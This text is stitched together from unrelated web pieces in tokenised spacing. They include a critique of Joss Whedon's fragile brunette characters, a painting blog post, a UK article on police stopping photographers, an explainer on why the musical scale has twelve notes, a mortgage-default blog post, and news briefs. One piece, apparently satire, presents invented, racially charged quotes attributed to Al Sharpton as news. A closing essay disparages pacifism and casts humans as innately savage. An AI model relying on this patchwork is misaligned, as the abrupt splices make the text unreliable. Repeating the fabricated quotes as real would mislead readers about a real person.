And I think that tells us something about Joss , that he ca n’t seem to produce a creative work without this character .
He inserts her again and again , setting up situations in which she can be saved , but in the end , she ’s often doomed despite the best efforts of the other ( usually male ) characters .
The classic example of this character is , of course , River Tam on Firefly .
We are introduced to her in a state of total vulnerability , naked and unconscious inside a transport capsule .
As the series progresses , River seems almost more like set dressing than anything else .
She creeps around , barefoot , of course .
She mystifies and puzzles the other characters .
Sometimes she shrieks in the night , mutters strings of gibberish .
She ’s the Damaged Girl , and the other characters become intensely invested in her and highly protective of her , with Simon and Mal in particular being River ’s champions and defenders .
River
Tam almost seems like the class pet more than anything else , but of course she also carries a whiff of danger , which is another aspect of the disturbed brunette theme .
It ’s not enough that the Disturbed Brunette be fragile and dependent on others , she must also be unstable , and that instability must reveal tremendous danger .
This is seen perhaps most spectacularly with Drusilla , whom we see on Buffy and Angel .
Drusilla , of course , was driven into a very strange mental state by Angelus , who wanted to exploit her visions for his own purposes .
She is , like all the brunettes , ethereal .
Pale .
Thin . Mysterious .
She has an imperfect grasp of reality .
Like the other brunettes , she floats instead of walking , unnerves other characters , even her friends , and sometimes speaks in riddles and rhymes .
Deadly , yet patronized by the characters around her , with other characters jumping in to protect her .
This is really underscored in the scenes in which we see her playing with dollies , which are supposed to emphasize how “ childlike ” she is , as she murmurs to herself and cries to Spike because her birdie died .
Spike literally calls her “ pet , ” emphasizing how disdainfully he views her , but Drusilla is in fact quite a deadly pet indeed .
She is shown , on numerous occasions , to be incredibly lethal .
The Brunette appears again in Angel , when Fred is rescued from Pylea .
Again , a theme ; she ’s shy , withdrawn , thin , and unstable .
Other characters need to protect her , even as they are sexually attracted to her .
She is , like the other Brunettes , neuroatypical and she ’s depicted as incredibly fragile and in need of rescuing and protection , being pathetically grateful towards her rescuers , Gunn , Angel , and Wesley .
Fred ’s also dangerous , as proved when she uses her innovative skills to evade Wesley and Gunn in “ Billy . ”
Like the other Brunettes , it seems that despite her apparent fragility , she is able to muster up deep instincts from within to defend herself when the time comes before subsiding back into her state of enforced helplessness .
Tara , in Buffy , is another example of this recurrent character , who breaks out of the mold a bit by having primarily female protectors in the form of Willow and Buffy .
( And , of course , Tara is dirty blonde , not brunette . )
The other characters feel the need to protect her even while bringing her out of her shell .
Most irritatingly of all , in “ Tough Love ” ( Season Five ) , Tara is attacked by Glory , and brought to a state of total helplessness because Glory sucked her mind out .
We are treated to a number of painful scenes in which characters care for the now - disabled Tara , spoonfeeding her applesauce and trying to calm her shrieks and mumblings .
I do n’t want to get into Joss Whedon and disability at this particular moment , but suffice it to say that Whedon ’s treatment of disability is hardly enlightened , and the brunettes play heavily into that treatment , because all of them inhabit troped characterizations of mental illness .
Dollhouse features several of the brunettes , including a number of imprints which fit the brunette theme .
Caroline and Whiskey both appear to be very troubled women who may experience mental illness on some level , and both of them are reduced to a state of profound helplessness in the Dollhouse .
A state which also carries an edge of danger , of course .
And look , Caroline has Ballard to rescue her , while Whiskey ’s got Boyd Langton .
And what happens to all of these women ?
River is abducted and must be rescued in Serenity .
Underscoring the fact that she is fragile and helpless and needs the men to save her ( even though she also holds back a pack of Reavers singlehanded at the end , go figure ) .
Drusilla is allowed to remain at large , but we are repeatedly reminded that she suffers without having a protector around , whether it ’s Spike , Darla , or someone else .
Fred dies , with her body being overtaken by Illyria .
Though Illyria is blue and a goddess , she ’s got a bit of the brunette thing going on herself ; strange , isolated , sad , and in need of guardians and protectors to help her navigate the world .
Tara , of course , is murdered at the end of season six .
Caroline ’s story is still unfolding , and the last we saw of Whiskey in this season of Dollhouse , she was fleeing the Dollhouse after being confronted with the truth about her identity .
( She also appears in “ Epitaph One , ” of course , but I do n’t want to get into her characterization there because I know that not all of you have seen that episode . )
This recurring character perturbs me .
I do n’t like that the brunettes all seem to need to be rescued .
I do n’t like that they are all clearly mentally ill , and depicted in a way which I think is rather damaging for women with mental illness .
They do n’t need treatment , or an acknowledgment of what is happening in their brains , they just need some men around to protect and help them !
They may be mentally ill and fragile and damaged , but watch out , they are also deadly and dangerous !
And , in the end , they will all suffer because of who they are ; they are not allowed to live rich , independent , happy lives .
It could be said that this is true of many of Whedon ’s characters .
Few of them get to live independent , happy lives , and thus it ’s not that surprising that , in a small sampling of Whedonverse characters , none of them are really happy .
But to see the same character coming up and facing the same things again and again says something .
Something troubling .
The fact that many of these characters are also very popular also , in my opinion , says something troubling .
It tells me that people feel interested in , engaged with , and attached to these characters .
That some fans , perhaps , imagine themselves in the positions of the ones doing the saving , and maybe some fans imagine themselves being saved .
There ’s a reason that characters like Bella in the Twilight Saga are so compelling ; it ’s because many of us fantasize , to some degree or another , about being helpless and being rescued by someone big and strong who will make all our worries go away , or about being the rescuer .
The brunettes are a realization of this .
Is Whedon projecting himself into the role of the saviour ?
I think he might be .
Will he ever be able to tell a story without a disturbed brunette ?
Only time will tell .
ETA : Thanks to the flood of misogynist and ableist comments I ’ve gotten on this post , I am closing comments .
Sorry to all of you who actually wanted to engage and discuss , but I just cannot .
Deal with this .
Right now .
I may reopen comments in the future .

My brainmeats are not in a good space right now and I really cannot engage / deal at the moment . )

I finally found the time this afternoon to paint again .
First time I 've been able to do so in months .
Weekdays full of finding a new job and then being AT the new job , and do n't even get me started on weekends .
Our house has been Grand Central station for months .
But I finally had the house entirely to myself for an entire afternoon and could crank the Mp3s and completely zone out into Photoshop again .
______________________________________
Aprox . 8 hours in photoshop .... all painted except the girl herself which was originally a Poser render ( bald and nude as usual ) and the sky which is stock from Getty because I 'm too lazy at this point to break my brain drawing clouds .... especially after all that rock .
The render was an old one that i found in the depths of my harddrive from last year sometime .
I had plans for it originally ( not this ) but never got around to it .

" That is a little surprising , " said Kelvyn Anderson , deputy director of the Police Advisory Commission .
" It does n't make much sense for them not to put something out there , especially with a crime like this - usually once you start pulling on the string , other victims come out . "
The Rev. Al Sharpton held a press conference today to blast Tiger Woods for the lack of diversity among his mistresses .
Sharpton claims that the lack of African - American women among Woods ’ harem will have a negative effect on the black community , specifically young black girls .
“ Why is it that a man who calls himself black ca n’t bring himself to cheat on his wife with a black woman ? ” said Sharpton , speaking to a group of supporters in Harlem .
“ What does it say to young black girls everywhere when you pass them over ?
Shame on you , Tiger Woods .
What would your daddy say ? ”
Sharpton , who has long championed taking black women as mistresses , said that today ’s black athletes need to stop neglecting black women when it comes to extramarital affairs , and should follow the examples of positive black role models such as Jesse Jackson and Martin Luther King , Jr. , both of whom cheated on their wives with black women .
Sharpton also stressed that cheating with African - American women would help the black community financially by giving black girls the chance to sell their stories to tabloids and gossip magazines .
Added Sharpton , “ I ’m not asking you to not cheat on your wives , I ’m just asking you to give back to your own community . ”

How police in Big Brother Britain treat you like a terrorist for taking holiday snaps
On Tuesday morning , a sunny day in London , Grant Smith decided to make use of the good light and set out to take some photographs of Christ Church on the corner of Newgate and King Edward Street .
Australian - born Smith has lived in the capital for more than 25 years .
He is an award - winning architectural and construction photographer , but this was a personal project .
' I 've been making a study of the Wren churches in the City , ' he explains .
' The church was rebuilt by Sir Christopher Wren in the late 17th century after being destroyed in the Great Fire .
Taking photos of classic scenes such as London buses on Oxford Street at Christmas could lead to happy snappers being ' treated like potential terrorists on reconnaissance missions '
' It was heavily damaged during the Blitz , so all that remains are two walls and a steeple - there 's a public garden where the rest of the church once stood - and it 's beautiful . '
But not everyone approved of this innocent activity .
Smith was standing on the corner with his cameras when he was approached by a security guard from the neighbouring Bank of America Merrill Lynch building .
' He asked me for ID , ' says Smith .
' I politely explained that I did n't need to provide ID as I was standing in a public place .
Then another , more senior , security guard came out .
' Again , I said that I did n't have to say who I was , and withdrew to the other side of the road . '
Smith was then approached by a Police Community Support Officer ( PCSO ) who demanded to know what he was doing .
Their conversation was cut short by the noisy arrival of blaring police sirens bearing down from the east and west .
As Smith watched in astonishment - three police cars , lights flashing frenetically , as well as a police riot van containing armed police officers , swerved into view and pulled up to investigate the ' incident ' - which consisted of nothing more than a man taking pictures of a church in the capital in broad daylight .
A tourist photographs Big Ben : Under Section 44 of the Terrorism Act 2000 , police can stop and search anyone within certain geographical areas without the usual requirement of reasonable suspicion
Fortunately , as a professional photographer , Smith knew exactly what was going on , so he was more angry than distressed .
This had , after all , happened to him before .
Nor is he the only one .
Up and down the country , every day , people whose only ' crime ' is to be carrying a camera and using it to take harmless snapshots of landmarks - or even , in one extraordinary case , a fish and chip shop - are being stopped , questioned by the police and asked to give their personal details .
Sometimes , they are told ( wrongly ) that they are not allowed to take photographs - despite being in a public place .
On occasion , the police have even ( illegally ) asked people to delete photographs from their camera .
This is happening to tourists , day - trippers , sightseers and amateur photographers , as well as professionals .
The reason for this absurdity is a controversial piece of legislation known as Section 44 of the Terrorism Act 2000 .
Section 44 gives police the right to stop and search anyone within certain geographical areas without the usual requirement of reasonable suspicion .
It was brought in as a counter - terrorism measure .
But , increasingly , members of the general public are complaining that because of it they are being treated like potential terrorists on reconnaissance missions .
Even snapping the traditional British fish and chip joint could land you in hot water with the police
' It 's an issue that has affected our readers a lot , ' says Chris Cheesman , news editor of Amateur Photographer magazine .
' Some of the reports that come in are bizarre .
' One man from Kent , for example , was visiting relatives in Hull and while he was there decided to have a wander in the city centre .
He was taking pictures when he was stopped and told not to , on the grounds that some of the buildings were sensitive . '
Jeff Moore , chairman of the British Press Photographers Association ( BPPA ) , concurs .
' It 's a constant thing .
It 's particularly prevalent in London and around Westminster .
' I'm asked to speak at lots of events across the country and this subject comes up again and again .
I hear about it from landscape photographers , members of the public , reams of people - anyone of any description who might have a camera .
' There was one case of a professor of history who was stopped because he was taking a photograph of a park bench in South London , for goodness sake . '
The thinking behind Section 44 was that by giving each force the opportunity to designate entire areas of their region as ' stop - and - search - zones ' it would help police protect places considered to be vulnerable to terrorist attacks - for example , railway stations , power plants and government buildings .
The trouble is , because areas covered by Section 44 are often kept secret - for fear that it would help terrorists plan attacks - it is impossible to know whether you are in one or not .
Indeed , we are not even allowed to know how many such areas there are nationwide , nor how many square miles they cover .
Many feel there is also a problem with over - zealous policing , particularly by Community Support officers and junior police officers ; others blame the imprecise legislation .
Two campaign groups , www.notacrime.com and ' I 'm a photographer not a terrorist ' , set up to provide information for those uncertain of their rights , have each attracted support from several thousand people over the past few months .
There is certainly no shortage of ridiculous examples of innocent photographers being stopped and questioned in a way that many find intimidating .
Two weeks ago , BBC photographer Jeff Overs was standing outside the Tate Modern by the Thames in London , taking pictures of sunset over St Paul 's Cathedral , when he was approached by a policewoman and a community support officer who said they were ' stopping people who were taking photographs as a counter - terrorism measure ' .
Overs was asked to give his name , address and date of birth and issued with an anti-terrorism stop - and - search form - this in a place full of people enjoying a classic view of the capital , many of them recording it on their camera or mobile phone .
' I was outraged at such an infringement on my liberty , ' says Overs .
' Foreign tourists must think Britain has become a police state . '
Indeed .
In April , two Austrians were taken aback when they were stopped at Walthamstow bus station in East London where , like so many millions of other visitors to Britain before them , they had been taking pictures of London 's famous red buses .
They were asked to delete their pictures and , unaware that police have no authority to enforce this without a warrant , they complied .
If they had not , there is no guarantee that their perceived hostility would not have got them into a tighter corner .
Park life :
One professor of history was stopped because he was taking a photograph of a park bench in London
Alex Turner , from Kent , discovered the cost of questioning police authority in the summer , after he was stopped by two men on Chatham High Street while taking a picture of a fish and shop called Mick 's Plaice .
According to Turner 's account the men refused properly to identify themselves .
When he continued to question their authority , they summoned uniformed police .
He took pictures of the two officers as they approached him - and was then arrested , held handcuffed in a police van for more than 20 minutes , searched , and interviewed by two plain - clothes officers .
As Andrew White , from Brighton , points out , it all seems a terrible waste of resources at a time when public services are already stretched to the limits .
Mr White was taking photographs of the Christmas decorations in Burgess Hill , West Sussex , as he walked to work when he was stopped and asked for his details .
He says : ' I do n't think taking too many photos in the street warrants being considered as some kind of terrorist threat .
Surely the money spent on getting PCSOs to harass me in the street could be better spent elsewhere . '
The situation is all the more ridiculous when you consider that many of those who are stopped are taking pictures of streets or buildings that are already documented and available to anyone to search online , thanks to Google 's photographic ' Streetview ' project .
Google sent a fleet of vehicles to take pictures of every street in major cities .
Austin Mitchell , MP for Grimsby , tabled an Early Day Motion condemning police action against lawful photography in public places .
' This is pure officiousness , ' he says .
' Photography is a joy and a pleasure , not something to feel furtive and persecuted about .
People have the right to take photographs and particularly of historic landmarks and buildings .
' Here we have PCSOs and also junior constables inhibiting people from taking them .
It 's nothing to do with terrorism , it 's just a desire to throw weight around . '
Mitchell also blames the law : ' If you pass legislation like that , you get silly consequences . '
A Home Office spokesman insists : ' We have no intention of Section 44 or Section 58A being used to criminalise ordinary people taking photos or legitimate journalistic activity .
' We have issued guidance to all police forces , advising that these offences should not be used to capture an innocent member of the public , tourist or responsible journalist taking a photograph of a police officer .
These offences are intended to help protect those in the frontline of our counter - terrorism operations from terrorist attack . '
But Shami Chakrabarti , the director of civil rights pressure group Liberty , believes the law needs to be reassessed .
' Section 44 stops are not based on reasonable suspicion , ' she says .
' And we know that less than one per cent result in arrest .
' Hassling photographers and preventing them from carrying out perfectly ordinary assignments helps nobody , but blame must rest squarely with Parliament .
It is time for this blunt and overly broad power to be tightened . '
Some fear that if the situation continues , a gradual process of attrition will mean that in a few years ' time people will feel too nervous about what they are and are not allowed to do , and that they will stop taking photographs of public buildings altogether .
' There is a danger to journalism , ' says the British Press Photographers Association 's Jeff Moore , ' because this is impeding the way we can report .
And what about our pictorial history ?
' When we think of the past , we think of iconic images , like the one taken by Bert Hardy of two women sitting on railings on the seafront with their skirts blowing around their waist .
But if things go on , we run the risk that the visual history of our country will not be recorded .
' We wo n't have anything like that in future .
It will only be recorded by the state , through police pictures , or security firms , through CCTV cameras . '
Then Big Brother really will have triumphed .
Mrs Jones says she was told her actions could be deemed to be bullying A Christian supply teacher has been suspended from her job teaching ill children at home after offering to pray for a sick pupil .
Olive Jones , 54 , from Weston - super - Mare , said the girl had been too poorly for a lesson .
The teacher then decided to speak about her belief in miracles .
But the girl 's mother said they were not believers and made a complaint .
Mrs Jones , who did not have a formal contract , was told by Oak Hill Short Stay School she would be suspended .
Mrs Jones , who is originally from Llanteg in Pembrokeshire , visited the child at her home on 25 November and said she was told of the decision just hours after the incident .
The part - time maths teacher had worked for the Oak Hill Short Stay School and Tuition Service North in Nailsea , near Bristol , for almost five years .
I am amazed that a country with such a strong Christian tradition has become a country where it is hard to speak about your faith
Olive Jones
She said : " If I had done something criminal , I believe the reaction would have been the same .
" It is like a black mark against my name and character when it comes to getting a reference for another job , just because I shared my testimony , as if I committed a criminal act .
" I simply wanted to encourage them to be open to prayer but if they did not want to then I would never force it down their throat . "
She said she had been called to her manager 's office and told that sharing her faith with a child could be deemed to be bullying .
Mrs Jones added : " I was in complete shock , I was trembling .
" I am amazed that a country with such a strong Christian tradition has become a country where it is hard to speak about your faith . "
' Their loss ' Nick Yates , of North Somerset Council , said : " Olive Jones has worked as a supply teacher , working with the North Somerset Tuition Service .
" A complaint has been made by a parent regarding Olive .
This complaint is being investigated .
" To complete the investigation we need to speak to Olive and we have offered her a number of dates so this can happen .
" At the moment we are waiting for her to let us know which date is convenient for her . "
In February a community nurse , Caroline Petrie , also from Weston - super - Mare and a friend of Olive Jones , was suspended from her job for offering to pray for a patient .
She was later reinstated by the health trust .
Speaking about her friend 's case , Mrs Petrie said : " All Olive wants to do is help , she sometimes cries over those children and calls me to pray with her over the phone for them .
" This is a total shock , she is an amazing maths teacher so it really is their loss . "
Mrs Jones , who has been a teacher for more than 20 years , trained at Aberystwyth University in Wales .

Twelve - Tone Musical Scale
Why does our musical scale have twelve notes ( counting both the white and black keys on the piano ) ?
Why not ten or fifteen or twenty ?
To answer this question , we first need some background information .
A note 's pitch or frequency is measured in cycles per second ; for example , A ' is 440 cycles per second .
The distance between two notes , measured as the ratio of their pitches , is called an interval .
If the interval between two notes is a ratio of small integers , such as 2/1 , 3/2 , or 4/3 , they sound good together — they are consonant rather than dissonant .
People prefer musical scales that have many consonant intervals .
There is no absolutely definitive list of consonant intervals because the concept of consonance involves subjective aesthetic judgment .
However , the following seven pure intervals , smaller than or equal to an octave ( 2/1 ) and larger than unison ( 1/1 ) , are commonly considered to be consonant .
Basic Consonant Intervals
Ratio Interval Harmonic Inverse 2/1 octave 1/1 3/2 perfect fifth 4/3 4/3 perfect fourth 3/2 5/3 major sixth 6/5 5/4 major third 8/5 6/5 minor third 5/3 8/5 minor sixth 5/ 4
This list can be constructed mathematically by listing the ratios of the smallest integers and including their harmonic inverses ( defined below ) .
First , list the ratios of the integers from 1 to 5 , where the ratios are between 1 ( unison ) and 2 ( octave ) : 1/1 , 2/1 , 3/2 , 4/3 , 5/3 , and 5/4 .
Then , include their harmonic inverses [ shown in brackets ] : 1/1 [ 2/1 ] , 2/1 [ 1/1 ] , 3/2 [ 4/3 ] , 4/3 [ 3/2 ] , 5/3 [ 6/5 ] , and 5/4 [ 8/5 ] .
Remove the duplicates .
We can ignore the trivial unison interval .
This leaves : 2/1 , 3/2 , 4/3 , 5/3 , 5/4 , 6/5 , and 8/5 .
If you start with the integers from 1 to 3 or 1 to 4 , the result is the top three intervals : 2/1 , 3/2 , and 4/3 .
If you start with the integers from 1 to 5 or 1 to 6 , the result is this list of seven intervals .
Harmonic inverses :
Two intervals are harmonic inverses of each other if they combine to make an octave , in other words , if the ratios multiplied together equals two — for example , 3/2 x 4/3 = 2 .
Harmonic inverses appear spontaneously when you construct a new musical scale .
Imagine making a musical instrument with three strings .
Start with two strings making an octave , a low string and a high string with half the length and twice the pitch .
Now , add a string somewhere in the middle , for example , 2/3 the length and 3/2 the pitch of the low string .
Playing the low and middle strings together makes a 3/2 interval ( perfect fifth ) , and playing the middle and high strings together makes another interval , the harmonic inverse of 3/2 , which is 2 /( 3/2 ) = 4/3 ( perfect fourth ) .
Each time you add a string between the low and high strings ( the octave ) , you always get two intervals that are harmonic inverses .
In the past , people constructed scales based on pure or natural ratios of small integers .
For example , the just intonation system uses the exact ratios shown in the table below .
However , this method runs into serious problems .
Although some of the intervals are perfect , other combinations of notes sound very bad ( " wolf intervals " ) .
After the Middle Ages in Europe , music became more complex , with more polyphony and more key changes , and these bad intervals became more common .
The modern equal temperament ( ET ) system was invented ( in the 1500s ) to solve this problem .
( Galileo 's father , a music theorist , was one early proponent of equal temperament . )
The octave is divided into twelve exactly equal intervals .
In this system , the smallest interval , the semitone , is not a simple integer ratio , but is the twelfth root of two ( 21/12 ) or approximately 1.059 .
Larger intervals are powers of the twelfth root of two , as shown in the table below .
Although no interval ( except the octave ) is perfect in this system , the error is " spread around " evenly so there are no very bad intervals .
The table below compares just intonation with equal temperament .
The intervals in both systems are never exactly the same ( except the octave ) , but they are very close — always within about one percent or better .
For example , the fifth ( 3/2 ) , obtained by multiplying the twelfth root of two by itself seven times , is 1.498 — very nearly a perfect 1.500 .
The fourth ( 4/3 ) , obtained by multiplying the twelfth root of two by itself five times , is 1.335 — very nearly a perfect 1.333 .

* This table shows one variation of just intonation .
So , back to the original question :
Why does our scale have twelve notes ?
We have explained that an equal - tempered scale works better in practice than a scale based on pure intervals , but we have not yet explained why we prefer the twelve - tone equal - tempered scale .
Why do we not use a ten - tone or twenty - tone equal - tempered scale ?
Is there something special about twelve ?
The answer is :
Yes , the twelve - tone equal - tempered scale is remarkable .
The nearly perfect intervals seen in the table above are not typical of other equal - tempered scales .
Consider the seven basic consonant intervals ( described above ) : 2/1 , 3/2 , 4/3 , 5/3 , 5/4 , 6/5 , and 8/5 .
We observe :
The twelve - tone equal - tempered scale is the smallest equal - tempered scale that contains all seven of the basic consonant intervals to a good approximation — within one percent .
Furthermore , for the most important intervals , the fifth ( 3/2 ) and fourth ( 4/3 ) , the approximations are better — within about one tenth of one percent .
Let 's compare the twelve - tone equal - tempered scale to some other equal - tempered scales .
All equal - tempered scales with 14 tones or fewer , except the twelve - tone scale , contain at most only three of the seven basic consonant intervals ( including the octave ) within one percent .
Several equal - tempered scales with more than twelve and fewer than 53 tones contain all seven basic consonant intervals within one percent , and some of these contain some intervals that are better than the twelve - tone scale , but they also contain some that are worse .
The most important intervals , the fifth ( 3/2 ) and fourth ( 4/3 ) , are usually worse .
19 - tone ET :
The fifth and fourth are worse than in 12 - tone ET , but the other basic intervals are better .
24 - tone ET :
All the basic intervals are exactly the same as in 12 - tone ET .
29 - tone ET :
The fifth and fourth are slighty better than in 12 - tone ET , but all the basic intervals have approximately the same accuracy as in 12 - tone ET .
31 - tone ET :
The fifth and fourth are worse than in 12 - tone ET , but the other basic intervals are better .
34 - tone ET :
The fifth and fourth are worse than in 12 - tone ET , but the other basic intervals are better .
41 - tone ET :
The fifth and fourth have approximately the same accuracy as in 12 - tone ET , but the other basic intervals are better .
53 - tone ET :
All seven basic intervals have better accuracy than 12 - tone ET .
But bigger is not necessarily better .
Although scales with many tones have many nearly pure intervals that are consonant ( ratios of small integers ) , they have even more intervals that are dissonant ( not ratios of small integers ) .
In contrast , the small twelve - tone equal - tempered scale has more consonant intervals ( seven ) than dissonant intervals ( five ) .
We observe :
The twelve - tone equal - tempered scale is the only equal - tempered scale that contains all seven of the basic consonant intervals to a good approximation — within one percent — and contains more consonant intervals than dissonant intervals .
Also , scales with many tones are too large to be really practical : a keyboard with the same range as a piano would be huge .
In summary , the twelve - tone equal - tempered scale is probably the best compromise of all possible scales , and that is why it is now standard in the Western world and common all over the world .
Which equal - tempered scales , other than the twelve - tone scale , are most widely used ?
We are including here only equal - spaced or roughly equal - spaced scales , not unequal - spaced scales such as the common pentatonic scales ( black keys ) and heptatonic scales ( white keys ) .
Roughly equal - spaced 5 - tone and 7 - tone scales are found in several musical traditions .
The Indonesian gamelan slendro scale is a roughly equal - spaced 5 - tone scale .
The 6 - tone ( whole - tone ) equal - tempered scale is sometimes used in Western music , as in the impressionistic music of Debussy .
The 19 - tone equal - tempered scale has been used by some Western musicians since the Renaissance .
Indian music uses a subset of a roughly equal - spaced 22 - tone ( 22 shruti ) scale .
( The Western 12 tones can be related to the 22 shrutis as follows , two tones , unison ( 1 ) and fifth ( 3/2 ) , correspond to two basic shrutis , and the remaining ten tones each correspond to a range of tones bounded by two shrutis . )
Arabic and other Middle Eastern music uses a subset of a roughly equal - spaced 24 - tone ( quarter - tone ) equal - tempered scale .
The quarter - tone scale has been used by some Western musicians ( Boulez , Ives ) .
The 31 - tone equal - tempered scale has been used by some Western musicians since the Renaissance , especially in the Netherlands ( due to Huygens ) .
The Equal Temperament Musical Scales Worksheet ( MS Excel spreadsheet or PDF document ) shows all the ET scales ( up to 100 tones ) and shows how well they match the " ideal " intervals .
If you do n't agree with my ideal intervals , the spreadsheet allows you to enter your own ideal intervals .
If you do n't agree with my scoring , you can change the score function , if you know basic programming .
Note :
My mathematical results showing the specialness of the twelve - tone scale are fairly robust .
When I perform the same analysis with small variations of the discretionary inputs , the twelve - tone scale still looks remarkable .
For example , if I add or remove a few intervals near the end of my list of consonant intervals , the results are similar .
Also , if I increase the matching tolerance from 1 % to 2 % or reduce it to 0.8 % , the results are similar .
You can try your own variations with the spreadsheet above .
It ’s Christmas Week !
I ’m going to go ahead and write some fun quasi - off - topic rough draft stuff this week since we ’ve been wandering in financial reform for some time .
To start : Megan McArdle and Steve Waldman are having an interesting back and forth on the idea of cultural norms and strategic defaulting .
( In order , Megan , Steve , Megan , Steve .
I really enjoyed Steve last post there , but they are all worth a read . )
It starts with McArdle referring to strategic defaulters , those who could continue to pay on an underwater mortgage but decide to mail in the keys and stop payments , as “ The New Breed of Deadbeats . ”
Though they are n’t breaking any laws , and are probably acting in their own financial best interest , they are tearing up the implicit social norms that create the conditions for our excellent credit markets .
Megan :
I am afraid that I am one of those people who have no patience for people who refuse to pay their debts …
There is a sizable school of thought that says why should n’t they ?
They made a contract with the bank under known rules , and as long as they ’re willing to pay the penalties , why should n’t they just walk away , the way a corporation would ?
Well , for one thing , companies do n’t always behave like this , and those who get a reputation for stiffing their suppliers run into trouble .
But for another , because society does n’t really work on such clean logic .
The reason we can have easy bankruptcy and a pretty robust credit market ( usually ) is that most people act like debts are obligations which should always be paid off if possible .
I do , on one level , find this kind of argument interesting .
I ’ve heard some arguments , tracing back to Karl Polanyi and other Continental thinkers , that say instead of taking ‘ the market ’ as granted we need to critically interrogate the social construction and performance of markets , examining the way they ( re ) produce cultural norms .
The logic of the market , like the subject , does not precede a dense network of power relations but is instead produced through these relations , which forms the necessary conditions of its possibility .
Heck I even made it through a good chunk of the feat of endurance that is The Social Structures of the Economy , where Bourdieu points out each and every sociological fact running underneath a Parisian couple trying to buy a house .
Again , I ’m used to this argument coming from sociologists , anthropologists , certain types of radical political economists , etc. instead of a libertarian with a MBA from the University of Chicago , but it ’s always a fun discussion .
Let ’s dig a little deeper into this argument .
McArdle is using social norms to end the argument , but really invoking it starts a seperate argument that needs to draw on what has been changing in social norms over the past 30 years .
Nostalgianomics , Neoliberalism
Without some argument about what is driving changes in social norms , the line of reasoning quickly devolves into Nostalgianomics – “ Why ca n’t people just pay their mortgages off ? ” looks a lot like “ Why do CEOs have to make so much money ?
The social norm used to be 30 x a worker ’s salary , but now its over 300x . ”
And here is where some neoliberalism theory can help .
There ’s been a move to fashion the individual as an entrepreneurial being in a system of “ extending and disseminating market values to all institutions and social action … the production of all human and institutional action as rational entrepreneurial action . ”
I assume conflicts about this new mode of interactions is what is motivating Waldman in this discussion ( as it does me ) .
To put it all another way , McArdle is saying that people need to make sure to act against their financial interests for the sake of society .
Arch - Neoliberal and Hayekian Margaret
Thatcher said “ There is no such thing as society .
There are individual men and women , and there are families . ”
I think Thatcher ’s view is on the rise .
Shareholder ’s Rights McArdle ’s claim that “ [ Waldman ] interprets Friedman ’s argument that the responsibility of a firm was to maximize profits for its shareholders to mean that there are no standards of ethical conduct for corporations ” I think misses what Waldman is getting at .
Prior to the early 1980s it was very common to think of a corporation as a particularly embedded institution , something with obligations and duties to its workers and to its communities in addition to its responsibilities to shareholders .
This creates the conditions for people to think they have similar obligations to business institutions that go above and beyond the simply transactional .
I think McArdle thinks you can remove one side of it while keeping the other in place – removing the social responsibility of the corporation while keeping the social responsibility of the individual in place .
I ’m not sure it is so easy .
( Before we go on , I think we can over - read social norms .
I ’d actual just put the change on the “ Alternative Mortgage Transaction Parity Act of 1982 ″ which created the ability for subprime lending . )
Obligations are a Two Way Street
But to put us on a more practical footing , what I see missing is McArdle not calling the mortgage lenders deadbeats for not modifying mortgages .
I assume anyone who thinks a person should act in a way to fulfill social obligations should also think that the counterparty should meet him or her halfway .
I can think of dozens of things banks could be doing : announcing that they wo n’t charge prepayment penalties , pushing out adverse rate resets , writing down principal , etc .
Instead we have the government trying to bribe mortgage lenders with taxpayer money to consider doing these things , a policy that has been a failure .
Where ’s the mutual obligation ?
2006 McArdle : “ You can dance around it all you want , but someone who borrowed money to buy a house in 2006 was borrowing money under the tacit moral norms of the time . ”
But what was that moral norm ?
From here we can see that bankers believed a housing crash of the kind we say was less than 5 % likely .
I also believe , and make the argument in that link , that a subprime loan was a vehicle for banks to take bets on housing price appreciation alongside homeowners .
Nash equilibriums
Not everything in life fits into a prisoner ’s dilemma diagram , but it is often useful for clarifying ideas .
I think what the anti-walking - away people are saying is that people need to cooperate with banks , so that the banks will co-operate back with them .
This misses a key point of the prisoner ’s dilemma :
If you are convinced that the other party will cooperate with you no matter what ( i.e. never walk away ) , that ’s when you fuck them over the hardest ( or more politely , that ’s when you ‘ do n’t co-operate ’ ) .
It ’s only through the threat of non-cooperation that you can actually secure cooperation .
If you are convinced that people will pay off their mortgage even though it was a high - hidden fee high - jump bet by a bank that housing would continue to appreciate then that ’s exactly what you ’ll offer .
The argument should be that it ’s only through some people actually just leaving that the banks would be motivated to take up their end of the social responsibility , if we can even conceive of such a thing anymore .
Mr Berlusconi praised his government in its fight against the mafia
Italian Prime Minister Silvio Berlusconi has vowed to defeat organised crime in the country by 2013 .
" The mafia is a pathological phenomenon that we want to defeat once and for all by the end of this term in office , " Mr Berlusconi told Italy 's national radio .
" No government in the history of the republic has acted with as much determination and efficiency in the fight against criminal organisations " .
Italian police have arrested hundreds of people in recent anti-mafia raids .
Those being held are accused of extortion , arms dealing and drugs trafficking .
Earlier this month , mafia informant Gaspare Spatuzza made an allegation that a Sicilian Mafia boss convicted of 1990s bombings had boasted of ties to Mr Berlusconi .
Gaspare Spatuzza said the Mafia boss claimed to have Mr Berlusconi 's support .
A spokesman for Mr Berlusconi , who denies the allegations , suggested the Mafia was trying to discredit the prime minister .
Four years ago a large part of the civilised world laboured under certain biological fallacies which may , in a sense , be held responsible for the extent and duration of the present conflict .
These fallacies , which were the foundation of pacifism and other pernicious forms of social and political radicalism , dealt with the capability of man to evolve mentally beyond his former state of subservience to primitive instinct and pugnacity , and to conduct his affairs and international or inter-racial relations on a basis of reason and good - will .
That belief in such capability is unscientific and childishly naive , is beside the question .
The fact remains , that the most civilised part of the world , including our own Anglo - Saxondom , did entertain enough of these notions to relax military vigilance , lay stress on points of honour , place trust in treaties , and permit a powerful and unscrupulous nation to indulge unchecked and unsuspected in nearly fifty years of preparation for world - wide robbery and slaughter .
We are reaping the result of our simplicity .
The past is over .
Our former follies we can but regret , and expiate as best we may by a crusade to the death against the Trans - Rhenane monster which we allowed to grow and flourish beneath our very eyes .
But the future holds more of responsibility , and we must prepare to guard against any renascence of the benevolent delusions that four years of blood have barely been able to dispel .
In a word , we must learn to discard forever the sentimental standpoint , and to view our species through the cold eyes of science alone .
We must recognise the essential underlying savagery in the animal called man , and return to older and sounder principles of national life and defence .
We must realise that man ’s nature will remain the same so long as he remains man ; that civilisation is but a slight coverlet beneath which the dominant beast sleeps lightly and ever ready to awake .
To preserve civilisation , we must deal scientifically with the brute element , using only genuine biological principles .
In considering ourselves , we think too much of ethics and sociology — too little of plain natural history .
We should perceive that man ’s period of historical existence , a period so short that his physical constitution has not been altered in the slightest degree , is insufficient to allow of any considerable mental change .
